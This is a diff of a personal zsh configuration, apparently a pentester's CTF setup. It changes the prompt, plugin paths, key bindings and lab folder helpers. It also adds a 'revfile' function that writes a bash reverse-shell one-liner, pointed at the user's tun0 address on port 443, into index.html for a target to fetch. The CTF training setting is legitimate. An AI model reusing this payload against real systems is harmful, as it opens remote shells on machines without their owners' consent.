@@ -6,7 +6,7 @@ if [[ -r "${XDG_CACHE_HOME:-$HOME/.cache}/p10k-instant-prompt-${(%):-%n}.zsh" ]]
 fi
 
 # Greeting
-# echo "Welcome $USER, ready to hack!!!"
+#echo "Welcome to Parrot OS"
 
 # Prompt
 PROMPT="%F{red}┌[%f%F{cyan}%m%f%F{red}]─[%f%F{yellow}%D{%H:%M-%d/%m}%f%F{red}]─[%f%F{magenta}%d%f%F{red}]%f"$'\n'"%F{red}└╼%f%F{green}$USER%f%F{yellow}$%f"
@@ -43,8 +43,8 @@ alias egrep='egrep --color=auto'
 # Jobs: suggest files / foldername / histsory bellow the prompt
 # Requires: zsh-autosuggestions (packaging by Debian Team)
 # Jobs: Fish-like suggestion for command history
-source ~/.zsh/zsh-autosuggestions/zsh-autosuggestions.zsh
-# source ~/.zsh/zsh-autocomplete/zsh-autocomplete.plugin.zsh
+#source /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh
+#source /usr/share/zsh-autocomplete/zsh-autocomplete.plugin.zsh
 # Select all suggestion instead of top on result only
 zstyle ':autocomplete:tab:*' insert-unambiguous yes
 zstyle ':autocomplete:tab:*' widget-style menu-select
@@ -57,7 +57,7 @@ bindkey $key[Down] down-line-or-history
 # Fish like syntax highlighting
 # Requires "zsh-syntax-highlighting" from apt
 
-source ~/.zsh/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
+source /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
 
 # Save type history for completion and easier life
 HISTFILE=~/.zsh_history
@@ -76,7 +76,6 @@ source ~/powerlevel10k/powerlevel10k.zsh-theme
 
 # To customize prompt, run `p10k configure` or edit ~/.p10k.zsh.
 [[ ! -f ~/.p10k.zsh ]] || source ~/.p10k.zsh
-
 
 
 alias ls='ls --color=auto'
@@ -106,7 +105,7 @@ workspace(){
 }
 
 mkt(){
-  mkdir {nmap,content,exploit}
+  mkdir {enumeration,intrussion,privesc_files}
 }
 
 workproject(){
@@ -131,7 +130,12 @@ challenges(){
 
 
 machines(){
-  cd /home/$USER/CTF/pentesting-roadmap/Machines
+  cd /home/$USER/CTF/pentesting-roadmap/Labs/Machines
+}
+
+
+gitComment(){
+  git add . && git commit -m "$1" && cat ~/.token.txt | tr -d "\n" | xclip -sel clip
 }
 
 
@@ -141,6 +145,14 @@ reducingSize(){
   # this function it's only for the compiling for go
   # programs.
   go build -ldflags "-s -w" $1
+}
+
+revfile(){
+  ip=$(ifconfig tun0 | grep -oP "inet\s(\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}?)" | awk '{print $2}')
+  echo -e "
+#!/bin/bash\n
+bash -c 'bash -i >& /dev/tcp/$ip/443 0>&1'
+"> index.html
 }
 
 
@@ -153,10 +165,15 @@ bindkey "^[[3~" delete-char
 bindkey "^[[1;3C" forward-word
 bindkey "^[[1;3D" backward-word
 
-
-
-
-
-export NVM_DIR="$HOME/.nvm"
-[ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"  # This loads nvm
-[ -s "$NVM_DIR/bash_completion" ] && \. "$NVM_DIR/bash_completion"  # This loads nvm bash_completion
+# Change cursor shape for different vi modes.
+function zle-keymap-select {
+  if [[ $KEYMAP == vicmd ]] || [[ $1 = 'block' ]]; then
+    echo -ne '\e[1 q'
+  elif [[ $KEYMAP == main ]] || [[ $KEYMAP == viins ]] || [[ $KEYMAP = '' ]] || [[ $1 = 'beam' ]]; then
+    echo -ne '\e[5 q'
+  fi
+}
+zle -N zle-keymap-select
+ 
+# Start with beam shape cursor on zsh startup and after every command.
+zle-line-init() { zle-keymap-select 'beam'}
